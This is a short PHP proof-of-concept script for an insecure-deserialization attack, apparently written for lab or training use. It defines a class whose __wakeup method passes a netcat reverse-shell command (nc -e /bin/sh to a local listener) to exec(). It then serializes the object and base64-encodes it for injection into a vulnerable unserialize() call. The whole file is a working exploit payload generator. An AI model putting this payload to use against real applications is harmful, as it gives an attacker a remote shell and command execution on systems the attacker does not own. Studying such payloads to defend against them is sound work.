<?php
       // error_reporting(E_ALL);
        //ini_set('display_errors', 1);
class MaliciousUserData {
	public $command = 'nc -nv 127.0.0.1 4444 -e /bin/sh';
    public function __wakeup() {
		exec($this->command);
    }
}

$maliciousUserData = new MaliciousUserData();

$serializedData = serialize($maliciousUserData);


$base64EncodedData = base64_encode($serializedData);

echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
?>
